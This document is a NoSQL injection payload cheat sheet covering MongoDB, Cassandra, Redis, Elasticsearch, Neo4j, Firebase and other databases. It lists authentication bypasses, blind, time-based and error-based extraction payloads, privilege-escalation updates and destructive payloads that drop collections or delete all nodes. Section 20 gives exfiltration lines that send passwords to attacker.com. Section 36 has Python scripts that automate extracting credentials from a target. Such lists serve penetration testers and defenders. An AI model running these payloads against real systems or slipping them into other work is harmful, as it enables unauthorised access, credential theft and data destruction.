<!--
[1] MONGODB AUTHENTICATION BYPASS
[2] MONGODB OPERATOR INJECTION
[3] MONGODB JAVASCRIPT INJECTION
[4] MONGODB UNION/AGGREGATION
[5] MONGODB DATA EXTRACTION
[6] MONGODB BLIND BOOLEAN
[7] MONGODB TIME-BASED
[8] MONGODB ERROR-BASED
[9] MONGODB NOSQLI TO SQLI
[10] MONGODB UPDATE OPERATORS
[11] MONGODB DELETE OPERATORS
[12] MONGODB FIELD DETECTION
[13] MONGODB REGEX BYPASS
[14] MONGODB COMMENT INJECTION
[15] MONGODB NESTED OBJECTS
[16] MONGODB ARRAY INJECTION
[17] MONGODB SANITIZATION BYPASS
[18] MONGODB TYPE CONFUSION
[19] MONGODB SERVER-SIDE JS
[20] MONGODB OOB EXFILTRATION
[21] MONGODB ENCODING BYPASS
[22] MONGODB WHITESPACE BYPASS
[23] MONGODB CASE VARIATION
[24] MONGODB ADVANCED CHAINED
[25] CASSANDRA INJECTION
[26] COUCHDB INJECTION
[27] REDIS INJECTION
[28] ELASTICSEARCH INJECTION
[29] DYNAMODB INJECTION
[30] ARANGODB INJECTION
[31] FIRESTORE INJECTION
[32] NEO4J (CYPHER) INJECTION
[33] REALTIME DB (FIREBASE)
[34] GRAPHQL NOSQL INJECTION
[35] WAF BYPASS FOR NOSQL
[36] AUTOMATION SCRIPTS
-->

<!--
[1] MONGODB AUTHENTICATION BYPASS
-->

-- Basic operator bypass
{"$ne": null}
{"$gt": ""}
{"$gte": ""}
{"$lt": null}
{"$lte": null}
{"$ne": 1}
{"$gt": 0}
{"$nin": [1,2,3]}
{"$exists": true}
{"$type": 2}

-- Array injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}

-- Login bypass examples
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regEx": "._"}, "password": {"$regEx": "._"}}
{"username": "admin' || '1'=='1", "password": "anything"}
{"username": "admin' || 1==1//", "password": "anything"}

-- Empty/null bypass
{"username": "", "password": ""}
{"username": null, "password": null}
{"username": undefined, "password": undefined}
{"username": [], "password": []}

-- Not equal bypass
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$nin": ["hacker"]}, "password": {"$nin": ["hacker"]}}

-- Exists bypass
{"username": {"$exists": true}, "password": {"$exists": true}}
{"$and": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}

<!--
[2] MONGODB OPERATOR INJECTION
-->

-- Comparison operators
username[$ne]=admin&password[$ne]=anything
username[$gt]=a&password[$gt]=a
username[$gte]=admin&password[$gte]=admin
username[$lt]=z&password[$lt]=z
username[$lte]=z&password[$lte]=z
username[$in]=[admin,root,user]&password[$in]=[pass,123]

-- Logical operators
username[$or]=[{"$ne":null},{"$eq":"admin"}]
$or=[{"username":"admin"},{"password":{"$ne":null}}]
$and=[{"username":"admin"},{"password":{"$regex":"^."}}]
$nor=[{"username":"invalid"},{"password":"invalid"}]

-- Element operators
username[$exists]=true
username[$type]=2
username[$type]="string"
username[$type]=16

-- Evaluation operators
username[$regex]=.\*
username[$regex]=^admin
username[$regex]=admin$
username[$options]=i
$where=1==1
$where=this.username=='admin'

-- Array operators
username[$size]=5
username[$all]=[a,d,m,i,n]
username[$elemMatch]={"$gt": 0}

-- Bitwise operators
username[$bitsAllSet]=1
username[$bitsAnySet]=1
username[$bitsAllClear]=1

<!--
[3] MONGODB JAVASCRIPT INJECTION
-->

-- Basic JS injection
{"$where": "1==1"}
{"$where": "true"}
{"$where": "this.username == 'admin'"}
{"$where": "function() { return this.username == 'admin' }"}

-- JS with operators
{"$where": "this.password.length > 0"}
{"$where": "this.username.match(/admin/)"}
{"$where": "this.username.indexOf('admin') != -1"}

-- JS for extraction
{"$where": "this.username == 'admin' && this.password.charAt(0) == 'a'"}
{"$where": "this.username.substring(0,1) == 'a'"}
{"$where": "this.password.slice(0,1) == 'p'"}

-- JS with regex
{"$where": "/^a/.test(this.username)"}
{"$where": "/admin/i.test(this.username)"}
{"$where": "this.password.match(/^[a-z]/)"}

-- JS with sleep (time-based)
{"$where": "sleep(5000) || true"}
{"$where": "function() { var start = new Date(); while(new Date() - start < 5000) {}; return true }"}
{"$where": "new Promise(resolve => setTimeout(() => resolve(true), 5000))"}

-- JS with error
{"$where": "throw new Error()"}
{"$where": "undefinedVariable"}

-- JS with concatenation
{"$where": "this.username == 'ad'+'min'"}
{"$where": "this.password == 'pa'+'ss'"}

<!--
[4] MONGODB UNION/AGGREGATION
-->

-- Aggregation pipeline injection
{"$unionWith": "users"}
{"$lookup": {"from": "users", "localField": "\_id", "foreignField": "user_id", "as": "user_data"}}
{"$project": {"username": 1, "password": 1}}
{"$match": {"username": "admin"}}

-- Facet injection
{"$facet": {"users": [{"$match": {}}], "admins": [{"$match": {"role": "admin"}}]}}

-- Group injection
{"$group": {"_id": "$username", "count": {"$sum": 1}}}
{"$group": {"\_id": null, "passwords": {"$push": "$password"}}}

-- Unwind injection
{"$unwind": "$array_field"}
{"$unwind": {"path": "$array_field", "preserveNullAndEmptyArrays": true}}

<!--
[5] MONGODB DATA EXTRACTION
-->

-- Extract with regex
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^a", "$options": "i"}}
{"username": {"$regex": "^.{5}$"}}

-- Extract with operators
{"username": {"$ne": null}, "$fields": {"password": 1}}
{"$where": "this.username == 'admin'", "$project": {"password": 1}}

-- Extract using $regex (blind)
{"$regex": "^a._"}
{"$regex": "^ad._"}
{"$regex": "^adm.*"}
{"$regex": "^admi._"}
{"$regex": "^admin._"}

-- Extract using $where (blind)
{"$where": "this.username.length > 0"}
{"$where": "this.username.length > 5"}
{"$where": "this.username.charAt(0) == 'a'"}
{"$where": "this.username.charCodeAt(0) > 96"}

-- Extract multiple fields
{"$where": "this.username && this.password"}
{"$or": [{"username": {"$exists": true}}, {"password": {"$exists": true}}]}

-- Extract with $in
{"username": {"$in": ["admin", "root", "user"]}}
{"password": {"$in": ["123456", "password", "admin123"]}}

<!--
[6] MONGODB BLIND BOOLEAN
-->

-- Length detection
{"$where": "this.username.length == 5"}
{"$where": "this.username.length > 3"}
{"$where": "this.username.length < 10"}

-- Character detection (positional)
{"$where": "this.username.charAt(0) == 'a'"}
{"$where": "this.username[0] == 'a'"}
{"$where": "this.username.substring(0,1) == 'a'"}
{"$where": "this.username.slice(0,1) == 'a'"}
{"$where": "this.username.substr(0,1) == 'a'"}

-- ASCII detection
{"$where": "this.username.charCodeAt(0) == 97"}
{"$where": "this.username.charCodeAt(0) > 96"}
{"$where": "this.username.charCodeAt(0) < 122"}

-- Pattern matching
{"$where": "/^a/.test(this.username)"}
{"$where": "/.\*min$/.test(this.username)"}
{"$where": "this.username.match(/^a/)"}

-- Existence detection
{"$where": "this.password != null"}
{"$where": "typeof this.password != 'undefined'"}
{"$where": "this.password !== undefined"}

-- Value comparison
{"$where": "this.password == 'secret'"}
{"$where": "this.password === 'secret'"}
{"$where": "this.password > 'a'"}
{"$where": "this.password < 'z'"}

<!--
[7] MONGODB TIME-BASED
-->

-- Sleep functions
{"$where": "sleep(5000)"}
{"$where": "function() { sleep(5000); return true }"}
{"$where": "new Promise(resolve => setTimeout(() => resolve(true), 5000))"}

-- Conditional sleep
{"$where": "if(this.username=='admin') { sleep(5000) } else { sleep(0) }"}
{"$where": "(this.username=='admin') ? sleep(5000) : sleep(0)"}
{"$where": "this.username=='admin' && sleep(5000)"}

-- Heavy computation
{"$where": "for(i=0;i<10000000;i++){}; return true"}
{"$where": "while(true){var x=1; if(x>10000000)break}"}

-- Regex heavy
{"username": {"$regex": "^(.*){10000}$"}}

-- Aggregation time
{"$group": {"_id": null, "count": {"$sum": {"$cond": [{"$eq": ["$username", "admin"]}, 1, 0]}}}, "$where": "sleep(5000)"}

<!--
[8] MONGODB ERROR-BASED
-->

-- Division by zero
{"$where": "1/0"}
{"$where": "var a = 1/0; return true"}

-- Invalid regex
{"username": {"$regex": "["}}
{"username": {"$regex": "(?!)"}}

-- Invalid type conversion
{"$where": "parseInt('abc')"}
{"$where": "Number('not a number')"}

-- Reference error
{"$where": "undefinedVariable"}
{"$where": "nonExistentFunction()"}

-- Type error
{"$where": "null.toString()"}
{"$where": "undefined.prop"}

-- Range error
{"$where": "new Array(-1)"}

-- Syntax error
{"$where": "return == true"}
{"$where": "if() { return true }"}

-- Nested error
{"$where": "eval('invalid js code')"}
{"$where": "Function('invalid')()"}

<!--
[9] MONGODB NOSQLI TO SQLI
-->

-- SQL syntax in NoSQL
{"username": "' OR 1=1--"}
{"username": "admin'--"}
{"username": "admin' OR '1'='1"}
{"username": "admin' UNION SELECT \* FROM users--"}

-- SQL keywords
{"username": {"$regex": "'.*--"}}
{"username": {"$regex": "'._OR._'"}}

<!--
[10] MONGODB UPDATE OPERATORS
-->

-- Set operator (privilege escalation)
{"$set": {"role": "admin"}}
{"$set": {"is_admin": true}}
{"$set": {"password": "hacked"}}

-- Inc operator
{"$inc": {"login_attempts": -9999}}
{"$inc": {"failed_logins": -100}}

-- Unset operator
{"$unset": {"required_field": ""}}
{"$unset": {"verification": ""}}

-- Push operator
{"$push": {"admin_list": "hacker"}}
{"$push": {"roles": "superadmin"}}

-- AddToSet operator
{"$addToSet": {"privileges": "root"}}

-- Rename operator
{"$rename": {"user": "admin", "pass": "password"}}

-- Current date
{"$currentDate": {"last_login": true}}

-- Mul operator
{"$mul": {"failed_attempts": 0}}

-- Min/Max operator
{"$min": {"login_count": 0}}
{"$max": {"login_count": 9999}}

<!--
[11] MONGODB DELETE OPERATORS
-->

-- Delete conditions
{"username": {"$ne": null}}
{"$where": "1==1"}
{"\_id": {"$ne": null}}

-- Drop collection injection
{"$expr": {"$function": {"body": "db.users.drop()", "args": [], "lang": "js"}}}

<!--
[12] MONGODB FIELD DETECTION
-->

-- Field existence
{"$where": "this.username != null"}
{"$where": "this.hasOwnProperty('username')"}
{"$where": "'username' in this"}
{"$where": "Object.keys(this).includes('username')"}

-- Field listing (blind)
{"$where": "Object.keys(this)[0] == '_id'"}
{"$where": "Object.keys(this)[1] == 'username'"}
{"$where": "Object.keys(this).length > 2"}

-- Field value type
{"$where": "typeof this.username == 'string'"}
{"$where": "typeof this.age == 'number'"}
{"$where": "Array.isArray(this.roles)"}

<!--
[13] MONGODB REGEX BYPASS
-->

-- Case insensitive
{"username": {"$regex": "^admin$", "$options": "i"}}
{"username": {"$regex": "^[Aa][Dd][Mm][Ii][Nn]$"}}

-- Wildcard regex
{"username": {"$regex": ".*"}}
{"username": {"$regex": "^"}}
{"username": {"$regex": "$"}}

-- Anchor bypass
{"username": {"$regex": "adm?in"}}
{"username": {"$regex": "ad.\*in"}}
{"username": {"$regex": "a.+n"}}

-- Character class
{"username": {"$regex": "[a-z]"}}
{"username": {"$regex": "[A-Z]"}}
{"username": {"$regex": "[0-9]"}}
{"username": {"$regex": "[a-zA-Z0-9]"}}

-- Negation
{"username": {"$regex": "^((?!admin).)*$"}}

<!--
[14] MONGODB COMMENT INJECTION
-->

-- JavaScript comments
{"$where": "// comment \n 1==1"}
{"$where": "/_ comment _/ 1==1"}
{"$where": "/_! 1==1 _/"}

-- JSON comments (not official, some parsers)
{"username": "admin", /_ comment _/ "password": {"$ne": null}}
{"username": "admin" // comment
}

<!--
[15] MONGODB NESTED OBJECTS
-->

-- Dot notation injection
{"user.username": {"$ne": null}}
{"user.password": {"$ne": null}}
{"profile.data": {"$regex": ".\*"}}

-- Nested operator
{"$or": [{"user.username": "admin"}, {"user.role": {"$eq": "admin"}}]}

<!--
[16] MONGODB ARRAY INJECTION
-->

-- Array index injection
{"roles[0]": "admin"}
{"roles.0": "admin"}
{"roles.-1": "admin"}

-- Array length
{"$where": "this.roles.length > 0"}
{"$where": "this.roles.includes('admin')"}

-- Array operators
{"roles": {"$in": ["admin"]}}
{"roles": {"$all": ["admin", "superuser"]}}

<!--
[17] MONGODB SANITIZATION BYPASS
-->

-- Quote bypass
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{username: {$ne: null}}
{username:{$ne:null}}

-- Space bypass
{"username":{"$ne":null}}
{username:{$ne:null}}
{$where:"1==1"}

-- Operator obfuscation
{"username": {"$n e": null}}
{"username": {"$n\u0065": null}}
{"username": {"$n\x65": null}}

<!--
[18] MONGODB TYPE CONFUSION
-->

-- String to number
{"age": {"$gt": "0"}}
{"age": {"$lt": "100"}}
{"id": {"$eq": "1"}}

-- Array to string
{"username": {"$in": [["admin"]]}}
{"username": {"$eq": ["admin"]}}

-- Object to string
{"username": {"$eq": {"$toString": "admin"}}}

-- Null to value
{"username": {"$ne": null}}
{"username": {"$eq": null}}

<!--
[19] MONGODB SERVER-SIDE JS
-->

-- MapReduce injection
{"mapreduce": "users", "map": "function() { emit(this.username, this.password) }", "reduce": "function(k, v) { return v }"}

-- $function operator (MongoDB 4.4+)
{"$expr": {"$function": {"body": "function() { return this.username == 'admin' }", "args": [], "lang": "js"}}}

-- Where with function
{"$where": "function() { return db.users.find().forEach(function(u) { if(u.username=='admin') print(u.password) }) }"}

<!--
[20] MONGODB OOB EXFILTRATION
-->

-- DNS exfiltration (requires specific drivers)
{"$where": "var x = new DNSResolver(); x.resolve('attacker.com/' + this.password)"}

-- HTTP exfiltration
{"$where": "var x = new XMLHttpRequest(); x.open('GET', 'http://attacker.com/' + this.password); x.send()"}

-- Log exfiltration
{"$where": "console.log(this.password)"}
{"$where": "print(this.password)"}

<!--
[21] MONGODB ENCODING BYPASS
-->

-- URL encoding
username%5B%24ne%5D=null
username%5B%24regex%5D=.\*
%7B%22%24where%22%3A%221%3D%3D1%22%7D

-- Unicode encoding
\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065
{"\u0024where": "1==1"}

-- Hex encoding
{"\\x24where": "1==1"}
{"\\u0024where": "1==1"}

-- Base64 encoding (if decoded server-side)
eyIkd2hlcmUiOiAiMT09MSJ9

<!--
[22] MONGODB WHITESPACE BYPASS
-->

-- No whitespace
{"$where":"1==1"}
{username:{$ne:null}}
{$where:"this.username=='admin'"}

-- Tab/Newline
{"$where": "\t1==1"}
{"$where": "\n1==1"}
{"$where": "\r1==1"}

<!--
[23] MONGODB CASE VARIATION
-->

-- Case variation (operators are case-sensitive!)
{"$WHERE": "1==1"}  // Won't work - operators must be lowercase
{"$Ne": null}
{"$Gt": ""}

-- But keys can be mixed
{"UsErNaMe": {"$ne": null}}
{"USERNAME": "admin"}

<!--
[24] MONGODB ADVANCED CHAINED
-->

-- Full extraction chain
// Step 1: Find database name
{"$where": "db.getName() == 'test'"}

// Step 2: Find collection names
{"$where": "db.getCollectionNames().includes('users')"}

// Step 3: Find field names
{"$where": "Object.keys(db.users.findOne())[0] == '_id'"}
{"$where": "Object.keys(db.users.findOne())[1] == 'username'"}

// Step 4: Extract data (blind)
{"$where": "db.users.findOne().username.charAt(0) == 'a'"}
{"$where": "db.users.findOne().password.length > 5"}

-- Combined bypass
{"$or": [{"username": {"$regex": "^a", "$options": "i"}}, {"$where": "sleep(5000)"}]}
{"username": {"$ne": null}, "$where": "this.password && sleep(5000)"}

<!--
[25] CASSANDRA INJECTION
-->

-- Authentication bypass
' OR 1=1 ALLOW FILTERING--
' AND password = '' OR ''='
' OR ''='

-- Union-like injection
' OR 1=1 LIMIT 1 ALLOW FILTERING
' AND role = 'admin' ALLOW FILTERING

-- Blind injection
' AND token(username) > token('a') ALLOW FILTERING
' AND password > 'a' ALLOW FILTERING

<!--
[26] COUCHDB INJECTION
-->

-- JavaScript bypass
{"selector": {"$and": [{"username": "admin"}, {"password": {"$regex": "^."}}]}}
{"selector": {"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}}

-- Map function injection
"\_design/example/\_view/total?key="admin' || '1'=='1"
"\_design/example/\_view/total?startkey="admin"&endkey="admin\u9999"

-- Update handler injection
{"\_id": "admin", "password": {"$ne": null}}

<!--
[27] REDIS INJECTION
-->

-- Command injection (if EVAL used)
EVAL "return redis.call('get', KEYS[1])" 1 "' OR 1==1--"
EVAL "if redis.call('exists','admin') then return 1 else return 0 end" 0

-- Lua injection
"return redis.call('get', '') .. redis.call('config', 'get', '\*')"

-- Auth bypass (if used for auth)
AUTH ' OR 1==1--
AUTH admin'--

<!--
[28] ELASTICSEARCH INJECTION
-->

-- Query DSL injection
{"query": {"bool": {"must": [{"match": {"username": "admin"}}]}}}
{"query": {"bool": {"should": [{"match_all": {}}]}}}
{"query": {"regexp": {"username": ".\*"}}}

-- Term injection
{"query": {"term": {"username": {"value": "admin", "boost": 1.0}}}}
{"query": {"terms": {"username": ["admin", "root", "user"]}}}

-- Range injection
{"query": {"range": {"password": {"gte": "a", "lte": "z"}}}}

-- Wildcard injection
{"query": {"wildcard": {"username": "_min"}}}
{"query": {"wildcard": {"username": "ad_"}}}

-- Script injection (if enabled)
{"query": {"script": {"script": "doc['username'].value == 'admin'"}}}
{"query": {"script": {"script": "doc['password'].value.length > 0"}}}

-- Function score injection
{"query": {"function_score": {"query": {"match_all": {}}, "functions": [{"script_score": {"script": "return 1"}}]}}}

<!--
[29] DYNAMODB INJECTION
-->

-- Key condition injection
KeyConditionExpression: "username = :u AND password = :p"
ExpressionAttributeValues: {":u": {"S": "admin' OR 1=1--"}, ":p": {"S": "anything"}}

-- Filter expression injection
FilterExpression: "contains(username, :val)"
ExpressionAttributeValues: {":val": {"S": "admin"}}

-- Update injection
UpdateExpression: "SET #role = :role"
ExpressionAttributeNames: {"#role": "role"}
ExpressionAttributeValues: {":role": {"S": "admin"}}

-- Condition injection
ConditionExpression: "attribute_exists(username) AND password = :p"

<!--
[30] ARANGODB INJECTION
-->

-- AQL injection
FOR u IN users FILTER u.username == '{{username}}' RETURN u
' OR 1==1 //
' OR 1==1 RETURN _
' UNION SELECT _ FROM users

-- Blind injection
FOR u IN users FILTER u.username == '{{username}}' && LENGTH(u.password) > 0 RETURN u
FOR u IN users FILTER u.username == '{{username}}' && SUBSTRING(u.username,0,1) == 'a' RETURN u

<!--
[31] FIRESTORE INJECTION
-->

-- Where clause injection
db.collection('users').where('username', '==', 'admin' || 1==1).get()
db.collection('users').where('username', '>=', '').where('password', '>=', '').get()

-- Array contains injection
db.collection('users').where('roles', 'array-contains', 'admin').get()

-- In query injection
db.collection('users').where('username', 'in', [['admin'], ['root']]).get()

<!--
[32] NEO4J (CYPHER) INJECTION
-->

-- Match injection
MATCH (u:User) WHERE u.username = '{input}' RETURN u
' OR 1=1 RETURN u
' OR 1=1 MATCH (a:Admin) RETURN a

-- Merge injection
MERGE (u:User {{username: '{input}'}})
MERGE (u:User {{username: 'admin'}})-[:IS_ADMIN]->(a:Admin)

-- Delete injection
' MATCH (n) DETACH DELETE n
' CALL dbms.procedures() YIELD name RETURN name

-- Blind injection
MATCH (u:User) WHERE u.username = '{input}' AND size(u.password) > 0 RETURN u
MATCH (u:User) WHERE u.username = '{input}' AND substring(u.password,0,1) = 'a' RETURN u

<!--
[33] REALTIME DB (FIREBASE)
-->

-- REST injection
/users.json?orderBy="username"&equalTo="admin' || 1==1--"
/users.json?orderBy="$key"&startAt="admin"&endAt="admin\uf8ff"

-- Rule injection
{"rules": {".read": "auth.uid === 'admin' || true", ".write": true}}

<!--
[34] GRAPHQL NOSQL INJECTION
-->

-- Operator injection
{"query": "query { users(username: {\_ne: null}, password: {\_ne: null}) { name password } }"}
{"query": "query { users(username: {\_regex: \".\*\"}) { name } }"}

-- Where injection (GraphQL + MongoDB)
{"query": "query { users(where: {username: {\_eq: \"admin\"}, \_or: [{password: {_is_null: true}}]}) { username password } }"}

-- Argument injection
{"query": "query($username: String!) { users(username: $username) { name } }", "variables": {"username": {"\_ne": null}}}

-- Directive injection
{"query": "query { users @include(if: true) { username password } }"}

<!--
[35] WAF BYPASS FOR NOSQL
-->

-- Encoding bypass
%7B%22%24%77%68%65%72%65%22%3A%22%31%3D%3D%31%22%7D
{"\\u0024where": "1==1"}

-- Comment injection
{"$where": "/* comment */1==1"}
{"username": {"$ne": null} // comment
}

-- Case variation
{"$WHERE": "1==1"}  // Doesn't work - keep lowercase
{"$wHeRe": "1==1"} // Doesn't work

-- Splitting across parameters
username[$ne]=null&password[$ne]=null
username[$regex]=._&password[$regex]=._

-- JSON parsing tricks
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null} } // extra space

<!--
[36] AUTOMATION SCRIPTS
-->

-- Python blind extraction for MongoDB

```python
import requests
import string

url = "http://target.com/api/login"
headers = {"Content-Type": "application/json"}

def blind_inject(payload):
    data = {"username": "admin", "password": payload}
    response = requests.post(url, json=data)
    return "success" in response.text

def extract_string_blind(field, max_len=50):
    result = ""
    for pos in range(max_len):
        for char in string.ascii_lowercase + string.digits + "_":
            payload = {"$where": f"this.{field}.charAt({pos}) == '{char}'"}
            if blind_inject(payload):
                result += char
                print(f"Found: {result}")
                break
        else:
            break
    return result

def extract_with_regex(field):
    result = ""
    charset = string.ascii_lowercase + string.digits + "_"
    while True:
        for char in charset:
            regex = f"^{result}{char}"
            payload = {"username": {"$regex": regex}}
            if blind_inject(payload):
                result += char
                print(f"Found: {result}")
                break
        else:
            break
    return result

def time_based_extract(field, pos):
    for char in string.ascii_lowercase:
        payload = {"$where": f"if(this.{field}.charAt({pos}) == '{char}') {{ sleep(5000) }}"}
        start = time.time()
        blind_inject(payload)
        elapsed = time.time() - start
        if elapsed > 4:
            return char
    return None

# Usage
username = extract_string_blind("username")
print(f"Username: {username}")

-- Python for Elasticsearch
import requests
import json

es_url = "http://target.com:9200/users/_search"

def elastic_inject(query):
    headers = {"Content-Type": "application/json"}
    data = {"query": {"script": {"script": query}}}
    response = requests.post(es_url, json=data, headers=headers)
    return response.status_code == 200

def extract_with_script():
    for pos in range(1, 20):
        for ascii_val in range(97, 123):
            script = f"doc['username'].value.charAt({pos-1}) == '{chr(ascii_val)}'"
            if elastic_inject(script):
                print(f"Character {pos}: {chr(ascii_val)}")
                break

-- Burp Intruder payload generator
# NoSQL payload generator for Burp
def generate_mongodb_payloads():
    payloads = []

    # Operator payloads
    operators = ["$ne", "$gt", "$gte", "$lt", "$lte", "$nin", "$exists", "$regex"]
    for op in operators:
        payloads.append(f'{{"username": {{"{op}": null}}, "password": {{"{op}": null}}}}')

    # Where payloads
    where_conditions = ["1==1", "true", "this.username=='admin'", "this.password.length>0"]
    for cond in where_conditions:
        payloads.append(f'{{"$where": "{cond}"}}')

    # Regex payloads
    regexes = [".*", "^a", "admin$", "^.{5}$"]
    for regex in regexes:
        payloads.append(f'{{"username": {{"$regex": "{regex}"}}}}')

    return payloads

# Generate wordlist
with open("nosql_payloads.txt", "w") as f:
    for payload in generate_mongodb_payloads():
        f.write(payload + "\n")

```
